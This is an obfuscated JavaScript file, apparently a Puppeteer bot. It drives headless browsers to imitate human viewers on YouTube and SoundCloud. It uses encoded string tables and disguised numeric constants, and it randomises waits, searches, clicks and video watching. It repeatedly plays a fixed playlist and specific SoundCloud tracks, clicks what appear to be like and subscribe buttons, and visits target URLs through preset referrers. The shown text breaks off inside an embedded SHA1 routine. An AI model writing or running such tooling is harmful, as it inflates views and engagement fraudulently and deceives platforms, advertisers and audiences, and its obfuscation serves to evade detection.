const Z = d,
  Y = c,
  X = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x22a * -0x9 + 0x1311 + -0x268a))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x592 + 0xfe0 + -0xa4e), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x2727 + -0x1e78 + 0xbacf + (-0x2cf * 0x14 + -0xe * -0x243 + 0x531a) * random()) : await standardWaitForNetIdle(f), await wait(-0x101 * -0x7 + 0x1cbc + 0x3 * -0x569 + (0x17 * -0x203 + 0xe * 0x409 + 0x99d * 0x3) * random()), -0xe90 + -0x3b6 * -0x1 + 0x18d * 0x7;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x6ad + 0xb2d * -0x1 + 0x2 * 0x12b1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1 * -0x4b4 + 0xc8e + 0x1141 * -0x1;
}

function a() {
  const bm = [
    'l3P5zw5PDgGVtq',
    'st\x20ex\x20empl',
    'BKFdHMyIW6ldUgVcP8og',
    '8X2fF4pgM0',
    'https://ba',
    'zxjLDMfYmda5',
    'uxlcJSkyWONcLG',
    'funny,funn',
    'text/plain',
    'WPxdPLJdIrlcO2JdRHzR',
    'BgvUz3rO',
    'W5RcRtSeg8kWmav5ea',
    'zwfZEwzVCMSUBW',
    'WRVcGSkUee3cUxOWD8oh',
    'mMDrshvdBeXdyG',
    'bIXqNjtsEf',
    'yxzLlxnLCgfYyq',
    'EuPIrdbezJq1Dq',
    'W5NdMCowWQ9PhSozWP8AWOy',
    'BCk4WPVcVH8QWQfky8oz',
    'zgL1Bs5JB20Vqa',
    'E8ocmaC',
    'XWJH-6J5Ee',
    'tw96AwXSys81lG',
    'nmoXW7HmW5RcGZi6w3W',
    'cluding-co',
    'C3LUxZuYntiZlW',
    'empo/EasyV',
    'DYDjsCkdWQ/cLJf0kW',
    ')\x20AppleWeb',
    'W6JcHuRdMcRcQg0hWQZdRW',
    'Ahr0Chm6lY93DW',
    'toString',
    'BW/dSCkpW7ddOXRcQSoWrW',
    'here',
    'ike\x20Gecko)'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function randomWait() {
  return await wait(-0xea2 + 0x13a * -0x13 + -0x4 * -0xe5e + (0xa56 + -0x1 * -0x20bd + 0x7 * -0x35d) * random()), 0x19ac + 0x133d + -0x2ce8;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x9 * 0x24e + -0x15 * 0x77 + 0x3a9 * -0x3, -0x1523 + -0x175 * -0x1 + -0x1 * -0x13b5), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x176a0 + -0x1a03c + -0x4 * -0x44ff) * getRandomInt(-0x112b + -0x49 * -0x1 + 0x10e4, -0x30 * 0x33 + 0x1fd7 + -0x7 * 0x32e), h)), -0x1751 + 0x124d + 0x505;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x89a + 0x535 + 0x5 * -0x2c3;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1820 + -0xd19 + 0x253a]['split']('\x20');
    for (let k = -0x1e1 * 0x3 + -0x3 * -0xbeb + -0x606 * 0x5; k < i['length']; k += -0x1 * -0x2335 + -0x456 + -0x1edd * 0x1)
      j += i[k] * h[i[k + (0x15ba + -0x10d8 + -0x1 * 0x4e1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = b,
      j = Array['from'](document[R(0x1e, 'TIbo') + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x26f8 + 0x29 * -0x14 + -0x23be)['map'](l => Array['from'](l['children']))['flat'](-0x1ccb + 0xcaf + 0x101d)['map'](l => l['childNodes'][-0x1c81 * -0x1 + 0xa * 0x64 + -0x88 * 0x3d]['childNodes'][-0x2122 + -0xefd + 0x301f]['childNodes'][0x1 * -0x23eb + -0x6 * 0x454 + 0x3de4]['childNodes'][0xafc + -0xd59 * 0x2 + 0x7db * 0x2]['childNodes'][0xb3f + 0x254c + -0x308a]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x20de * 0x1 + 0x1a71 + -0x17 * -0x73, 0x1 * 0xb89 + -0x1 * 0x1f21 + -0x139 * -0x20)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x346c + 0x17 * 0x88 + 0x62cc);
  const h = await getMaxTime(f),
    i = Math['min']((-0xe2fa + -0xccf5 * 0x1 + 0x29a4f) * getRandomInt(-0x2 * 0x235 + -0x1c72 + 0x2 * 0x106f, -0x19fd + 0x1d4f + -0x34d), h);
  return await wait(i), 0x4 * 0x469 + -0x1 * -0x170b + 0x1 * -0x28ae;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * 0x1d9e + 0xf * 0x1c9 + 0x2d7);
    let h = e[f];
    if (c['WOoNed'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x46f + -0x26dd + 0x2b4c, r, s, t = 0x923 * 0x2 + -0x252f + 0x2f * 0x67; s = m['charAt'](t++); ~s && (r = q % (0x1311 + 0x729 + -0x1a36) ? r * (-0x592 + 0xfe0 + -0xa0e) + s : s, q++ % (-0x687 + -0x514 + 0xb9f)) ? o += String['fromCharCode'](-0x5e * 0x33 + -0x7 * -0x182 + 0x92b & r >> (-(-0x101 * -0x7 + 0x1cbc + 0x3 * -0xbeb) * q & 0x1 * -0x1723 + 0x7 * 0x409 + 0xd9 * -0x6)) : -0xe90 + -0x3b6 * -0x1 + 0x1cf * 0x6) {
          s = n['indexOf'](s);
        }
        for (let u = -0x6ad + 0xb2d * -0x1 + 0x1 * 0x11da, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1 * -0x4b4 + 0xc8e + 0x1132 * -0x1))['slice'](-(-0xea2 + 0x13a * -0x13 + -0x2 * -0x12f9));
        }
        return decodeURIComponent(p);
      };
      c['LuGxnW'] = i, b = arguments, c['WOoNed'] = !![];
    }
    const j = e[0xa56 + -0x1 * -0x20bd + 0x1 * -0x2b13],
      k = f + j,
      l = b[k];
    return !l ? (h = c['LuGxnW'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * 0x1d9e + 0xf * 0x1c9 + 0x2d7);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function frontScreenActions(f) {
  const S = b;
  return log(S(0xb, 'o)$N') + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xe1c + 0x2 * 0x9fd + -0x2 * 0x2ef]['children'][0x1303 + -0x2 * -0x23b + -0x1779]['children'][0x258 + -0x100f * 0x2 + 0x1dc6]['children'][0x3 * 0x3 + 0x9b3 + -0x9bc]['children'][0xbf4 + -0x2 * 0x371 + 0xb * -0x76]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1 * -0x9fa + 0x5ed + -0x1 * -0x40e;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x95f * -0x3 + -0xf * 0x28d + -0x2 * -0x2162 + (-0x2b1 * 0x2 + 0x54 * 0x67 + -0x1c38) * random()
  }), await wait(-0xc9c + 0x23a * -0xd + 0x2b82 + (0x97a * -0x2 + -0xab1 * -0x2 + -0x142 * 0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x207e + -0xc59 + 0x10b * 0x2b]['childNodes'][-0x6d * -0x47 + 0x5ca + -0x2404]['childNodes'][-0x1 * -0x2273 + -0x18b5 + 0x9bd * -0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1c48 + -0x58a + 0x33f * -0x7]['childNodes'][-0x2f0 * 0x2 + 0x1228 + 0xc48 * -0x1]['childNodes'][-0x26b * 0xb + 0x2047 + 0x16 * -0x42]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1 * -0x6fb + -0xa1b + 0x1117),
          r = -0x20f0 + 0x450 * -0x9 + 0x47c0;
        for (let u = 0xc * -0x269 + 0x1d0e + -0x22; u < q['length']; u += -0x2 * 0x1097 + -0x190a * -0x1 + 0xe * 0x95)
          r += q[u] * k[q[u + (0x838 + -0x76 * 0x1d + 0x527)]];
        return r;
      }(n);
  });
  await wait((-0x11 * 0x19e + 0x2ff7 * 0x1 + 0x261f) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1af02 + -0x5814 * -0x3 + 0x19126) * getRandomInt(0x16cf * -0x1 + -0x8d6 * -0x2 + 0x524, -0x168 * -0x6 + -0x15e2 + 0xd7c), h + (-0xd88 + -0x5a1 + 0x7bd * 0x5));
  return await wait(i), -0x6f3 + -0x1aa0 + 0x266 * 0xe;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * 0x1d9e + 0xf * 0x1c9 + 0x2d7);
    let h = e[f];
    if (b['udGKYi'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x46f + -0x26dd + 0x2b4c, s, t, u = 0x923 * 0x2 + -0x252f + 0x2f * 0x67; t = n['charAt'](u++); ~t && (s = r % (0x1311 + 0x729 + -0x1a36) ? s * (-0x592 + 0xfe0 + -0xa0e) + t : t, r++ % (-0x687 + -0x514 + 0xb9f)) ? p += String['fromCharCode'](-0x5e * 0x33 + -0x7 * -0x182 + 0x92b & s >> (-(-0x101 * -0x7 + 0x1cbc + 0x3 * -0xbeb) * r & 0x1 * -0x1723 + 0x7 * 0x409 + 0xd9 * -0x6)) : -0xe90 + -0x3b6 * -0x1 + 0x1cf * 0x6) {
          t = o['indexOf'](t);
        }
        for (let v = -0x6ad + 0xb2d * -0x1 + 0x1 * 0x11da, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * -0x4b4 + 0xc8e + 0x1132 * -0x1))['slice'](-(-0xea2 + 0x13a * -0x13 + -0x2 * -0x12f9));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xa56 + -0x1 * -0x20bd + 0x1 * -0x2b13,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x19ac + 0x133d + -0x2ce9; u < 0x9 * 0x24e + -0x15 * 0x77 + 0x16d * -0x7; u++) {
          p[u] = u;
        }
        for (u = -0x1523 + -0x175 * -0x1 + -0x2 * -0x9d7; u < 0x1f38 + -0x22b0 + -0x8 * -0x8f; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x112b + -0x49 * -0x1 + 0x11e2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x30 * 0x33 + 0x1fd7 + -0x1 * 0x1647, q = -0x1751 + 0x124d + 0x504;
        for (let v = 0x89a + 0x535 + 0x5 * -0x2c3; v < n['length']; v++) {
          u = (u + (-0x1820 + -0xd19 + 0x253a)) % (-0x1e1 * 0x3 + -0x3 * -0xbeb + -0x1d1e * 0x1), q = (q + p[u]) % (-0x1 * -0x2335 + -0x456 + -0x9f5 * 0x3), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x15ba + -0x10d8 + -0x2 * 0x1f1)]);
        }
        return t;
      };
      b['RkvXyK'] = m, c = arguments, b['udGKYi'] = !![];
    }
    const j = e[0x26f8 + 0x29 * -0x14 + -0x23c4],
      k = f + j,
      l = c[k];
    return !l ? (b['uqjQaV'] === undefined && (b['uqjQaV'] = !![]), h = b['RkvXyK'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x212e + 0xf81 + 0x11ad * 0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1e31 + -0x1273 + -0x6 + (0xf0b + 0x1 * -0x2176 + 0x9 * 0x27b) * Math['random']());
    });
  }, -0x50e * 0x1 + -0x68f + 0x26f5);
  await wait(0x2fbe8 + -0xb806 + -0x127ff * -0x2);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1 * 0x1400b + 0x1a0be + 0xc41 * -0x29) * getRandomInt(-0x35e + -0x1948 + 0x1caa, 0x2611 + -0x13b + -0x24bd)), clearInterval(h), 0xcd6 + 0x1b9 * 0xa + -0x201 * 0xf;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x21 * 0x60 + 0x25cf + 0x11 * -0x17f;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x23b2 + 0x1d1 * -0x1 + 0x2584;
    await randomWait();
  }
  return 0x9e * 0x4 + 0x1 * 0x1ae1 + -0x272 * 0xc;
}

function fetchRandomSC() {
  return Math['random']() <= 0x20c4 + -0x99d + -0x1727 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x4 * 0x6f7 + -0xbd2 * -0x2 + 0x10 * -0x338 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x170f + -0x87 + 0xb44 * -0x2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * -0x22e2 + -0x4cf + -0x469 * -0x9;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x14f71 + 0xc24 * -0x7 + -0x4aad + getRandomInt(-0x37e * -0xc + 0x56c4 + 0xd * -0x564, 0x7 * -0x10d + 0x89d3 + -0xd48));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1b76 + -0x1be2 * -0x1 + -0x1 * 0x3757), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x790 + -0x1483 + 0xcf3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xa64 + -0x2 * -0xdcd + 0x89b * -0x2, -0xf95 + -0x1 * 0x107 + 0x10ce * 0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x2176 * -0x1 + -0x8b * -0x3e + -0x3b50 + floor((-0x1e0d + 0x1 * 0xb55 + 0x16a0) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x75ae09e2 * -0x2 + -0x1eb954ae + -0x4ca2bf16),
          -0x5a1132 + -0x801d * -0x197 + -0x25 * -0x638b,
          -0xc588 + -0xa60 + 0x14fe8,
          -0x6 * 0x484 + -0x1575 + 0x310d
        ], y = [
          -0x1 * -0x11f2 + 0x24fa + -0x27e * 0x16,
          -0x2 * 0x97 + 0x1a * -0x11e + 0x1e4a * 0x1,
          -0x1e74 + 0x1a03 + 0xe5 * 0x5,
          0x5 * 0x47 + -0x19f2 + 0x188f
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x87 * 0x45 + -0x3 * 0x107 + -0x7e5 * -0x5)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x3b + 0x188c + -0x18c7 * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const T = c;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x19 * -0x3d + 0xe09 * -0x1 + 0x13fe) === N[T(0xa)])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x4a1 * -0x1 + 0xc7 * 0x1 + 0x3da] = A[0x7 * -0x1be + 0x1 * -0x191f + 0x2561] = A[0x16d6 + -0x202b + -0x1 * -0x956] = A[-0x5 * -0x1f3 + -0x4 * -0x872 + 0x2b85 * -0x1] = A[-0xd * -0x189 + 0xe63 + -0x2255] = A[0xa99 * 0x2 + -0x1b9a * -0x1 + -0x30c8] = A[0x1 * 0x1e98 + -0x9b6 + -0x14dd] = A[-0x22a8 + -0x8f2 + 0x2ba0] = A[-0xdc1 * 0x2 + 0x1a40 + 0x149] = A[-0x867 + -0x25ab + -0x7 * -0x696] = A[-0x1229 * -0x1 + -0x469 * 0x1 + 0x1 * -0xdb7] = A[0x1c01 + -0x23aa + 0x7b3] = A[-0x1113 + 0x2 * -0x3cb + 0x18b4] = A[-0x21e4 + -0x3 * 0xf9 + 0x24db] = A[0x1a58 + -0x663 * -0x5 + -0x3a3a] = A[-0x1 * 0xaf6 + 0x1ce9 * 0x1 + -0x3 * 0x5f7] = A[0xda9 + 0x26f4 + -0xd9 * 0x3e] = 0xe5a * -0x1 + 0x2180 + -0x3 * 0x662, this['blocks'] = A) : this['blocks'] = [
                0x1 * -0xe20 + 0x1764 + -0x944,
                -0xc1 * -0x21 + 0xaa * 0x1e + -0x2ccd,
                0x89 * 0x8 + 0x219e + -0x25e6,
                0x91 + -0x25ff + 0x63d * 0x6,
                0x1ae3 + 0x6af + -0x2192,
                -0xc6d + 0xd0f + -0xa2,
                0x9b3 + 0x8 * -0x365 + -0x29 * -0x6d,
                0x10 * -0x22 + -0x6c * 0x7 + -0x28a * -0x2,
                0x1210 * -0x1 + 0xd48 + 0x4c8,
                0x10f * 0x1f + 0x23e9 + 0x39e * -0x13,
                0x3c2 + -0x798 + 0x3d6,
                -0xb30 + 0x30e + -0x15b * -0x6,
                0x1 * 0x20de + 0x11e1 * -0x1 + -0xefd,
                -0x1146 * 0x2 + 0x4 * -0x36c + 0x303c,
                -0x11 * 0xaa + -0xb3 * 0x29 + 0x35 * 0xc1,
                -0x15d * -0x8 + -0x1 * 0x786 + -0x1 * 0x362,
                -0x20d1 + -0x2014 + 0x40e5
              ], this['h0'] = 0x410345c7 + 0x7c4d3f92 + -0x560b6258, this['h1'] = -0x8ad * -0x249221 + 0x6c1d6dc5 + 0xb9978a89 * -0x1, this['h2'] = -0x373 * -0x3675c7 + -0x5 * -0x26b4f5d + 0x18 * -0x1f7948d, this['h3'] = -0x1c6313aa + 0x12bc691c + 0x19d8ff04, this['h4'] = -0x51530e94 + 0x183467a69 + -0x1 * 0x6e2089e5, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xcf * 0x3 + 0xd * -0x6f + -0x1 * -0x336, this['finalized'] = this['hashed'] = 0x5c * 0x65 + -0x10ed * 0x1 + -0x135f, this['first'] = 0x10ec * -0x1 + -0x177f * -0x1 + 0x349 * -0x2;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1aa2 + 0xab + -0x1b4d, O = J['length'] || 0x3d0 + 0x10d * -0x1e + 0x1bb6, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1 * 0xa5d + 0x21d2 + -0x2c2f, P[0xdd * 0x5 + -0xf1 * 0x4 + -0x8d] = this['block'], P[-0x2a * -0x7c + -0xa85 + 0x15 * -0x77] = P[-0x1770 + -0x18a0 + 0x3011] = P[-0x1 * 0x1385 + 0x1160 * 0x2 + -0xf39 * 0x1] = P[0x1 * -0x41e + 0x1dc5 * -0x1 + -0x2 * -0x10f3] = P[-0x441 + -0x1 * 0x981 + 0xdc6] = P[-0x483 + 0x49d + 0x7 * -0x3] = P[0x1 * -0xc6d + -0x99e + 0x1611 * 0x1] = P[0x71c + -0x1ceb + 0x15d6] = P[0xb * -0x2d9 + 0x1f1f + -0xa * -0x6] = P[-0x179 * 0x5 + -0xb36 * 0x1 + 0x18d * 0xc] = P[0x39 * -0x46 + -0x1783 + 0x2723] = P[0x26fb + -0x2f3 + 0xbff * -0x3] = P[-0x1bd4 + 0x5f0 + 0x15f0] = P[-0x1043 * -0x2 + 0x1c8d + -0xd6 * 0x49] = P[0x1f * 0x1d + -0xb93 + -0x40f * -0x2] = P[-0x1d * -0x4d + 0x255 * 0x3 + -0x13 * 0xd3] = 0x24fa * 0x1 + -0x19c6 + -0xb34), K) {
                    for (N = this['start']; M < O && N < -0x32 * -0x49 + 0x26ee + -0x34f0; ++M)
                      P[N >> 0x1290 + 0x1721 + -0x29af] |= J[M] << y[0x21b9 + -0x1 * 0x94f + -0x1 * 0x1867 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1 * 0xb03 + -0x12d4 * -0x2 + 0x25 * -0x14f; ++M)
                      (L = J['charCodeAt'](M)) < 0x101 * 0x13 + 0x25ab + 0x139 * -0x2e ? P[N >> 0xaf8 + -0x6 * 0x53 + -0x904] |= L << y[0x528 + -0x472 + -0xb3 & N++] : L < -0x20d7 + 0x1fa9 + 0x92e ? (P[N >> 0x1763 * 0x1 + -0x222c + 0x399 * 0x3] |= (0x1dca + 0x77 * 0x11 + 0x547 * -0x7 | L >> -0x148d + 0xce * 0x30 + -0x120d) << y[-0xa98 + 0x26e3 + -0x1c48 & N++], P[N >> 0x1ebb * -0x1 + -0x1 * 0x1609 + -0x2 * -0x1a63] |= (0x235 + 0x39f + 0x1f * -0x2c | 0xcc1 + -0xecf + 0x24d & L) << y[0x1c6c + -0x70f + -0x155a & N++]) : L < -0x9 * -0xd9a + 0x1363c + 0x1 * -0xd8a6 || L >= 0x3dde * 0x1 + 0x8b40 + 0x16e2 ? (P[N >> 0x1a3 * 0x17 + -0x24b * 0x7 + -0x1596] |= (-0xe * -0xa1 + -0x28 * 0x35 + 0x5 * 0x12 | L >> -0x12b5 + 0x2394 + 0x49 * -0x3b) << y[0x1c99 + 0x3ed + -0x2083 & N++], P[N >> -0x1 * -0x187c + -0x17 * 0x166 + 0x6 * 0x148] |= (-0x5c * -0x2a + -0x18ab + 0xa13 | L >> 0x445 * -0x1 + -0x61a + 0x1 * 0xa65 & -0x1bbf + -0x1f1 * 0xb + 0x3159) << y[0x208b * 0x1 + -0x66b * 0x4 + -0x36e * 0x2 & N++], P[N >> 0x2 * -0xc9 + 0x22c3 + 0x5 * -0x6a3] |= (0x2542 + -0x1b0c + -0x9b6 | -0x1 * 0x61a + 0x8fe * 0x4 + 0x1 * -0x1d9f & L) << y[-0x1bb * -0x13 + -0x541 * 0x5 + -0x699 & N++]) : (L = -0x1 * -0x963d + -0x1ca21 * 0x1 + 0x233e4 + ((0x9e * 0x3a + -0x519 * 0x3 + -0x1082 